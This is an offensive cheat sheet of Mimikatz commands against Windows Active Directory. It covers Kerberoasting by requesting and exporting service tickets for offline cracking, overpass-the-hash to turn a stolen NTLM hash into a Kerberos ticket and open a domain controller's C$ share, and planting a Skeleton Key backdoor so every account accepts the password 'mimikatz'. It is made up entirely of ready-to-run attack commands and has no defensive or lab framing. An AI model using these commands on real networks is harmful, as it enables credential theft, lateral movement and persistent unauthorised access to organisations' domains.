Kerberoasting with Mimikatz
# Request service ticket for SPN
kerberos::ask /target:HTTP/COMPUTER.domain.local

# Export service ticket
kerberos::list /export

# Crack offline with john/hashcat
# Ticket is in .kirbi format

Overpass the Hash

# Convert NTLM hash to Kerberos ticket
sekurlsa::pth /user:user /domain:domain.local /ntlm:NT_HASH /run:powershell.exe

# In new PowerShell window
klist  # Shows Kerberos ticket

# Use ticket to authenticate to resources
ls \\DC.domain.local\C$

Skeleton Key
# On Domain Controller as ADMIN
privilege::debug
misc::skeleton

# All users now authenticate with "mimikatz" password
# Works for all users, doesn't change actual passwords
net use \\DC\C$ /user:domain\anyuser mimikatz